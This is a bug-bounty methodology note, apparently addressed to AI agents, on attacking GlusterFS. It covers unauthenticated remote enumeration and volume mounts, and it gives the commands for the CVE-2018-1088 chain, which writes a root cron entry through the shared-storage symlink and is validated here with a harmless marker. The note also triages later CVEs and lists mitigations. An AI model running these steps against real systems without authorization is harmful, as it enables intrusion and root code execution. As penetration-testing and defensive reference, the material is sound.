---
technology: GlusterFS
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: storage
version: "1.0"
provenance: "upstream-only; zero corpus evidence by design — port facts and mount/auth behavior grounded against docs.gluster.org Setting-Up-Clients; CVE-2018-1088 chain, detection commands, and mitigation list grounded against Red Hat article 3414511; CVE-2022-48340 against the Red Hat CVE record; CVE-2023-26253 against gluster/glusterfs issue 3954 + rewritten from HackTricks (src/network-services-pentesting/24007-24008-24009-49152-pentesting-glusterfs.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# GlusterFS bug-bounty methodology

Companion overview: [[glusterfs]].

Scope: the glusterd management plane (24007–24008 and friends), unauthenticated native-client volume mounts, the `gluster_shared_storage` special volume, and verified CVE triage. Sibling storage surfaces with their own units: [[nfs]].

## Phase 0 — Fingerprint the pool

```bash
nmap -p 24007,24008,24009,49152-49200 -sV 198.51.100.10
```

24007 answering is glusterd even when this node hosts no brick for the volume you want; record it as a management-plane finding separate from data access. Install the client utilities on the attacking host: `apt install -y glusterfs-cli glusterfs-client`.

## Phase 1 — Remote enumeration without credentials

The CLI's `--remote-host` option points commands at a remote glusterd — no pool membership required:

```bash
gluster --remote-host 198.51.100.10 peer status
gluster --remote-host 198.51.100.10 volume info all
```

`peer status` names the trusted pool (cluster membership); `volume info all` is the target list — volume names, brick host/path pairs, transport types, and the options that gate your mount: `auth.allow`/`auth.reject` CIDR filters and TLS settings. If the pool serves NFSv3 or CIFS as well, those are parallel paths to the same bricks.

## Phase 2 — Mount the volume

```bash
sudo mkdir -p /mnt/gluster
sudo mount -t glusterfs -o ro 198.51.100.10:<vol_name> /mnt/gluster
```

Read-only first. If the mount fails, the client log (`/var/log/glusterfs/<vol_name>-*.log`) names the gate: TLS enforcement (`transport.socket.ssl`/client+server SSL volume options) or address-based access control (`auth.allow`). A TLS-gated volume in an authorized lab takes a provisioned client's material (`/etc/ssl/glusterfs.pem`, `.key`, `.ca` per the upstream TLS guide) — never copy production credentials outside scope. Remember the fan-out: the mount server only serves the volfile; your client then talks to every peer it lists.

## Phase 3 — `gluster_shared_storage` and the CVE-2018-1088 chain

`gluster_shared_storage` is a feature volume consumed by geo-replication and snapshot scheduling. The historical escalation (CVE-2018-1088, Red Hat–rated Important, fixed in the RHSA-2018:1136/1137 generation) is precise: on a 3.x server where an administrator ever ran `snap_scheduler.py init`, that script created `/etc/cron.d/glusterfs_snap_cron_tasks` as a **symlink into this volume** — and since any client may mount the volume, any client that can write it controls a file root's cron parses. Disabling scheduling later does not remove the symlink.

Server-side preconditions first (from the vendor's own detection steps):

```bash
gluster volume get all cluster.enable-shared-storage
ls -l /etc/cron.d/glusterfs_snap_cron_tasks      # symlink → shared_storage?
```

Client-side, in an explicitly authorized disposable lab only: mount read-only, inventory the volume (`find /tmp/gss -xdev -printf '%M %u:%g %p\n'`-style), then remount read-write and validate with a marker rather than a shell:

```bash
sudo mount -o remount,rw /tmp/gss
printf '* * * * * root /usr/bin/touch /tmp/marker-cve-2018-1088\n' | \
  sudo tee /tmp/gss/glusterfs_snap_cron_tasks
```

The entry mutates a root cron source — remove it immediately after validation. Current releases changed the shared-storage access model; treat the chain as historical-precondition analysis, not a default expectation. An older hint worth one filesystem look: `/ss_bricks/` appeared in past guidance, but no documented version maps it to automatic execution — inventory consumers instead of assuming code runs from it.

## Phase 4 — Version triage against verified CVEs

Run `gluster --version` on every reachable node and reconcile package versions with distribution advisories before claiming anything.

- **CVE-2018-1088** — privilege escalation via the snapshot-scheduler symlink in shared storage (Phase 3). Preconditions: 3.x-era server, snapshot scheduling ever enabled, volume mountable by the client.
- **CVE-2022-48340** — use-after-free in the DHT `dht_setxattr_mds_cbk` path; a remotely crafted request crashes the affected process. Network-vector, no privileges, availability impact (CVSS 7.5); the CVE record describes GlusterFS 11.0.
- **CVE-2023-26253** — stack buffer over-read in the FUSE notify path (`fuse-bridge.c`), reached through a client callback (`client_cbk_inodelk_contention` in the upstream report). Network-triggerable denial of service; the upstream report required a matching client/server setup on a development build — a generic short XDR record thrown at glusterd is *not* a reproducer, so do not report on that basis alone.

Rule for all three: never infer affected ranges or code execution from a CVE title; the title says "use-after-free", the advisory says denial of service.

## Phase 5 — Reporting the fix

Upgrade to vendor-supported packages (mind backports); enforce TLS on client and server sides with certificate identity restrictions (`auth.ssl-allow` family per the upstream TLS guide) and CIDR filters (`auth.allow`) where TLS is impractical; keep 24007–24008 on a private VLAN or behind SSH tunnels; monitor `glusterd.log` for unexpected peer and mount events. For the 1088 residue: verify `cluster.enable-shared-storage`, hunt lingering cron symlinks on servers where scheduling was ever enabled.

## Appendix — tools in prose

`nmap` for port triage, the `gluster` CLI in `--remote-host` mode for peer/volume enumeration, `mount -t glusterfs` with read-only discipline, `find`/`ls` for shared-storage inventory, `gluster volume get` for server-side precondition checks, and the upstream docs' TLS tooling for lab-gated volumes.
